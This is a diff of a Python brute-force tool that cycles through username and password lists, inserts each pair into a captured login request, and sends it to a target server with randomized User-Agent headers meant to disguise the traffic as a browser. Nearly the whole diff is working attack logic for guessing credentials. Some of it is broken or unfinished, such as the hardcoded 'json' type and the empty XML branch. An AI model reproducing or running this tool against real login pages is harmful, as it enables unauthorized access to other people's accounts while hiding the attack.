@@ -27,79 +27,52 @@ def brute(parameters, passwords):
                }
 
     # return
-    req_body_type = get_req_type(content['req_header'])
+    req_body_type, content['req_body'] = get_req_type(content['headers'], content['req_body'])
+    print("up: " + str(content['req_body']))
     
     # if userlist is provided then checks if passwordlist is provided or just 1 password
-    if parameters['user_list']:
-        for user in parameters['user_list']:
-            user = user.strip()
-            user = user.split('\t')
-            content['username'] = user[0]
-            if passwords:
-                for password in passwords:
-                    password = password.strip()
-                    password = password.split('\t')
-                    content['password'] = password[0]
-                    content = change_cred(content['req_body'], content['user_param'], content['pass_param'], content['username'], content['password'], req_body_type)
-                    attack(content)
-            else:
-                content['password'] = parameters['password']
-                attack(content)
-    # if 1 username is provided then checks if passwordlist is provided or just 1 password
-    elif passwords:
-        content['username'] = parameters['username']
+    for user in parameters['user_list']:
+        user = user.strip()
+        user = user.split('\t')
+        content['username'] = user[0]
         for password in passwords:
             password = password.strip()
             password = password.split('\t')
             content['password'] = password[0]
+            content['req_body'] = change_cred(content['req_body'], content['user_param'], content['password_param'], content['username'], content['password'], req_body_type)
             attack(content)
 
-    else:
-        content['username'] = parameters['username']
-        content['password'] = parameters['password']
-        attack(content)
-        
-def get_req_type(type):
-    pass
+
     
 
 
 def change_cred(req_body, user_param, pass_param, username, password, req_body_type):
-    print('type: ' + type(req_body))
+    print('[+]type: ' + str(type(req_body)) + "real type: " + str(req_body_type))
+    req_body[user_param] = username
+    req_body[pass_param] = password
+    
     if req_body_type == 'JSON':
-        # import ast
-        # return ast.literal_eval(req_body)
-        req_body[user_param] = username
-        req_body[pass_param] = password
         return req_body
     
-    elif req_body_type == 'URL_ENCODED':
-        import urllib
-        # convert from encoded to json
-        req_body = urllib.parse.parse_qs(req_body)
-        req_body[user_param] = username
-        req_body[pass_param] = password
-        # convert from json to encoded
-        return urllib.parse.urlencode(req_body)
-
-    elif req_body_type == 'HTML':
-        pass
     elif req_body_type == 'XML':
         pass
-    pass
+        
+    elif req_body_type == 'URL_ENCODED':
+        import urllib
+        return urllib.parse.urlencode(req_body)  # convert from json to encoded
 
 def attack(content):
     '''
    create a packet containing fake headers and the payload(username,password) and submit it to the server
     '''
-
-    url = content['url']
+    print("url: " + str(content['host']))
+    url = content['host']
 
     # build packet headers in order to disguise as a browser
     headers = content['headers']
     headers['User-Agent'] = get_random_user_agent()
     payload = content['req_body']
-
+    print("[+ req_body]: " + str(content['req_body']))
 
     res = requests.get(url)
     if content['method'] == 'post':
@@ -139,16 +112,20 @@ def get_random_user_agent():
         return random_proxy[0:len(random_proxy) - 2]
 
 
-def get_req_type(header):
-    type = header['Content-Type']
+def get_req_type(header, req_body):
+    type = 'json' # header['Content-Type']
+    print("header: " + str(type))
     if 'json' in type:
-        return 'JSON'
+        return 'JSON', req_body
 
     elif 'xml' in type:
-        return 'XML'
+        import xmltodict
+        return 'XML', xmltodict.parse(req_body)
 
     else:
-        return 'URL_ENCODED'
+        import urllib
+        return 'URL_ENCODED', urllib.parse.parse_qs(req_body)
+        
 
 def check_login(content_1, content_2):
     '''
